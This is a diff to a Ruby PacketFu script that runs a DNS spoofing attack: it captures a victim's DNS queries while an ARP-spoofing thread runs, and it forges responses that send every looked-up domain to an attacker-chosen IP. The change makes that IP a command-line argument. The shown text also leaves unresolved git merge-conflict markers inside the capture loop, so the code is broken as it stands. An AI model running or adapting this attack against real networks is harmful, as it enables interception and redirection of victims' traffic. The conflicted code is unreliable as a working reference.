@@ -3,9 +3,9 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 
-unless (ARGV.size == 2)
-	puts "Usage: ruby #{$0} [Interface] [Victim IP]"
-	puts "Example: ruby #{$0} em1 192.168.0.2"
+unless (ARGV.size == 2 || ARGV.size==3)
+	puts "Usage: ruby #{$0} Interface Victim-IP [Spoofer Web IP]"
+	puts "Example: ruby #{$0} em1 192.168.0.2 199.59.150.39"
 	exit
 end
 
@@ -108,7 +108,7 @@ def getDomain(payload)
 	puts "Domain Info: " + domainName
 end
 
-def dnsResponse
+def dnsResponse(spoofIP)
 	udp_packet = PacketFu::UDPPacket.new(:config => @srcMAC, 
 					     :udp_src => @packet.udp_dst, 
 					     :udp_dst => @packet.udp_src)
@@ -137,8 +137,8 @@ def dnsResponse
 	udp_packet.payload += "\x00\x04"
 
 	#ip = @srcMAC[:ip_saddr].split('.')
-	twitter_IP = "199.59.150.39" # Twitter IP
-	domain_IP = twitter_IP.split('.')
+	
+	domain_IP = spoofIP.split('.')
 	payload_domain = [domain_IP[0].to_i, domain_IP[1].to_i, domain_IP[2].to_i, domain_IP[3].to_i].pack('c*')
 
 	# Append the Domain Name payload
@@ -157,9 +157,16 @@ begin
 
 	intface = ARGV[0]
 	victIP = ARGV[1]
+	
+	if( ARGV.size ==3)
+		spoofIP = ARGV[2]
+	else
+		spoofIP = "199.59.150.39" # Twitter IP
+	end
 
 	puts "Victim IP: " + victIP
 	puts "Interface: " + intface
+	puts "Spoofed to: " + spoofIP
 
 
 	init(intface, victIP)
@@ -177,7 +184,7 @@ begin
 	capture = PacketFu::Capture.new(:iface => @interface, 
 					:start => true, 
 					:promisc => true, 
-					:filter => "src #{@victimIP} and udp port 53 and udp[10]&0x80 = 0",
+					:filter => "src #{@victimIP} and udp port 53 and udp[10]&128 = 0",
 					:save => true)
 
 	puts "Capturing DNS Queries..."
@@ -185,6 +192,7 @@ begin
 		puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
+<<<<<<< HEAD
 		@domain = getDomain(@packet.payload[12..-1])
 		if @domain.nil?
 			puts "No domain name found"
@@ -193,6 +201,16 @@ begin
 		puts "DNS Query for: " + @domain
 		dnsResponse
 	end
+=======
+			@domain = getDomain(@packet.payload[12..-1])
+			if @domain.nil?
+				puts "No domain name found"
+				next
+			end
+			puts "DNS Query for: " + @domain
+			dnsResponse(spoofIP)
+	end # End do packet
+>>>>>>> 371209722e822e8f0c400add5a6f1bea4527a858
 	arp_spoof_thread.join
 
 	# Catch interrupt
